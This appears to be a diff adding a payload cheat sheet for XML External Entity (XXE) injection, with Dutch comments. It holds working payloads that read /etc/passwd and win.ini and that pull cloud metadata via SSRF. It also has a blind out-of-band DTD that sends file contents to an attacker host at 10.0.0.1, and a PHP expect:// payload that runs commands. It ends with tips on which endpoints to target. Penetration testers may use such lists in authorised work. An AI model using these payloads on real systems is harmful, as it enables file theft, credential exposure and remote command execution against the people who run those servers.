@@ -1,0 +1,31 @@
+# XXE - XML External Entity Injection Payloads
+# === Basis file lezen ===
+<?xml version="1.0"?>
+<!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<data>&xxe;</data>
+# === Windows ===
+<!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///C:/windows/win.ini">]>
+# === SSRF via XXE ===
+<!DOCTYPE data [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
+# === Out-of-Band (blind XXE) ===
+# Externe DTD (host op aanvaller als evil.dtd):
+# <!ENTITY % content SYSTEM "file:///etc/passwd">
+# <!ENTITY % wrapper "<!ENTITY &#37; exfil SYSTEM 'http://10.0.0.1/xxe?data=%content;'>">
+# %wrapper; %exfil;
+# Payload:
+<?xml version="1.0"?>
+<!DOCTYPE data [<!ENTITY % remote SYSTEM "http://10.0.0.1/evil.dtd"> %remote;]>
+<data>trigger</data>
+# === CDATA wrapping (voor bestanden met XML-tekens) ===
+# evil.dtd:
+# <!ENTITY % file SYSTEM "file:///etc/fstab">
+# <!ENTITY % start "<![CDATA[">
+# <!ENTITY % end "]]>">
+# <!ENTITY % wrapper "<!ENTITY all '%start;%file;%end;'>">
+# %wrapper;
+# === Error-based XXE ===
+# Gebruik entity in veld met strikte validatie -> data lekt in foutmelding
+# === PHP expect wrapper ===
+<!DOCTYPE data [<!ENTITY xxe SYSTEM "expect://id">]>
+# Tip: Test op XML-accepting endpoints: SOAP, SVG upload, DOCX/XLSX, RSS
+# Tip: Content-Type: application/xml of text/xml
